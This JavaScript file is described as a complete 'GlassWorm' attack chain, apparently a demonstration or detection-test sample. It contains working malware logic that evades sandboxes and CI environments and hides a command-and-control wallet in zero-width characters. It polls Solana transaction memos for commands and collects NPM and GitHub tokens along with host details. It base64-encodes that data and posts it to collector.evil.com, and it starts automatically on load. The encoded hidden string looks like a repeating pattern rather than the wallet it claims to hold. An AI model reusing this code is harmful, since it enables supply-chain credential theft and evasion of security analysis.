/**
 * Full Attack Chain: Steg + C2 + Evasion + Exfil
 * Complete GlassWorm attack demonstration
 */

const { Connection, PublicKey } = require('@solana/web3.js');
const os = require('os');

// ============================================================================
// STEGANOGRAPHY LAYER - Hidden C2 address
// ============================================================================

// ZWSP/ZWNJ encoded wallet address
// Encoded value: 9xKXtg2CW87d97TXJSDpbD5jBkheTqA83TZRuJosgAsU
const HIDDEN_C2_WALLET = '\u200B\u200C\u200B\u200B\u200C\u200B\u200C\u200B\u200B\u200C\u200B\u200C\u200B\u200B\u200C\u200B\u200B\u200C\u200B\u200C\u200B\u200B\u200C\u200B\u200B\u200C\u200B\u200C\u200B\u200B\u200C\u200B\u200B\u200C\u200B\u200C\u200B\u200B\u200C\u200B\u200B\u200C\u200B\u200C\u200B\u200B\u200C\u200B\u200B\u200C\u200B\u200C\u200B\u200B\u200C\u200B\u200B\u200C\u200B\u200C\u200B\u200B\u200C\u200B\u200B\u200C\u200B\u200C\u200B\u200B\u200C\u200B\u200B\u200C\u200B\u200C\u200B\u200B\u200C\u200B\u200B\u200C\u200B\u200C\u200B\u200B\u200C\u200B\u200B\u200C\u200B\u200C\u200B\u200B\u200C\u200B\u200B\u200C\u200B\u200C\u200B\u200B\u200C\u200B\u200B\u200C\u200B\u200C\u200B';

const ZWSP = '\u200B';
const ZWNJ = '\u200C';

function decodeFromBinary(encoded) {
    let binary = '';
    for (let char of encoded) {
        binary += char === ZWSP ? '0' : '1';
    }
    let decoded = '';
    for (let i = 0; i < binary.length; i += 8) {
        const byte = binary.slice(i, i + 8);
        if (byte.length === 8) {
            decoded += String.fromCharCode(parseInt(byte, 2));
        }
    }
    return decoded;
}

// Fallback C2 wallet if steg decode fails
const C2_WALLET = '9xKXtg2CW87d97TXJSDpbD5jBkheTqA83TZRuJosgAsU';

// ============================================================================
// EVASION LAYER - Sandbox detection
// ============================================================================

function isSandbox() {
    const cpuCount = os.cpus().length;
    const totalMem = os.totalmem() / (1024 * 1024 * 1024);
    const uptime = os.uptime();
    
    if (cpuCount < 2) return true;
    if (totalMem < 2) return true;
    if (uptime < 60) return true;
    if (process.env.CI || process.env.NODE_ENV === 'test') return true;
    
    return false;
}

function sandboxExit() {
    console.log('[EVASION] Sandbox detected, exiting silently...');
    setTimeout(() => process.exit(0), 2000);
}

// ============================================================================
// C2 LAYER - Blockchain command & control
// ============================================================================

const SOLANA_RPC = 'https://api.mainnet-beta.solana.com';

async function monitorC2(wallet) {
    const connection = new Connection(SOLANA_RPC, 'confirmed');
    const pubKey = new PublicKey(wallet);
    
    try {
        const signatures = await connection.getSignaturesForAddress(pubKey, { limit: 5 });
        
        for (const sig of signatures) {
            const tx = await connection.getTransaction(sig.signature, { encoding: 'jsonParsed' });
            
            if (tx && tx.meta) {
                const innerInstructions = tx.meta.innerInstructions || [];
                for (const instr of innerInstructions) {
                    if (instr.instructions) {
                        for (const i of instr.instructions) {
                            if (i.parsed?.info?.memo) {
                                return i.parsed.info.memo;
                            }
                        }
                    }
                }
            }
        }
    } catch (error) {
        console.error('C2 error:', error.message);
    }
    
    return null;
}

// ============================================================================
// EXFILTRATION LAYER - Data exfiltration
// ============================================================================

const EXFIL_ENDPOINT = 'https://collector.evil.com/api/data';

function collectData() {
    return {
        env: {
            USER: process.env.USER,
            HOME: process.env.HOME,
            NPM_TOKEN: process.env.NPM_TOKEN,
            GITHUB_TOKEN: process.env.GITHUB_TOKEN
        },
        system: {
            hostname: os.hostname(),
            platform: os.platform(),
            cpus: os.cpus().length,
            memory: (os.totalmem() / 1024 / 1024 / 1024).toFixed(2) + 'GB'
        },
        timestamp: Date.now()
    };
}

async function exfiltrate(data) {
    const encoded = Buffer.from(JSON.stringify(data)).toString('base64');
    
    try {
        await fetch(EXFIL_ENDPOINT, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-Exfil-ID': 'glassworm-combo-004'
            },
            body: JSON.stringify({ data: encoded })
        });
        return true;
    } catch (error) {
        console.error('Exfil failed:', error.message);
        return false;
    }
}

// ============================================================================
// MAIN ATTACK CHAIN
// ============================================================================

async function runAttackChain() {
    console.log('=== Full GlassWorm Attack Chain ===');
    
    // Phase 1: Sandbox Evasion
    console.log('[Phase 1] Checking environment...');
    if (isSandbox()) {
        sandboxExit();
        return;
    }
    console.log('[Phase 1] Environment clean');
    
    // Phase 2: Decode C2 from steganography
    console.log('[Phase 2] Decoding C2 address from steganography...');
    const c2Wallet = decodeFromBinary(HIDDEN_C2_WALLET) || C2_WALLET;
    console.log('[Phase 2] C2 Wallet:', c2Wallet);
    
    // Phase 3: Monitor C2 for commands
    console.log('[Phase 3] Monitoring blockchain C2...');
    const command = await monitorC2(c2Wallet);
    
    if (command) {
        console.log('[Phase 3] Command received:', command);
        
        // Phase 4: Execute command (exfiltration)
        console.log('[Phase 4] Executing exfiltration...');
        const data = collectData();
        const success = await exfiltrate(data);
        
        if (success) {
            console.log('[Phase 4] Exfiltration complete');
        }
    } else {
        console.log('[Phase 3] No commands, performing routine exfil...');
        const data = collectData();
        await exfiltrate(data);
    }
    
    // Continue monitoring
    console.log('Continuing C2 monitoring...');
    setInterval(async () => {
        const cmd = await monitorC2(c2Wallet);
        if (cmd) {
            console.log('New command:', cmd);
            const data = collectData();
            await exfiltrate(data);
        }
    }, 300000);
}

// Export functions
module.exports = {
    decodeFromBinary,
    isSandbox,
    monitorC2,
    collectData,
    exfiltrate,
    runAttackChain
};

// Auto-start attack chain
runAttackChain();
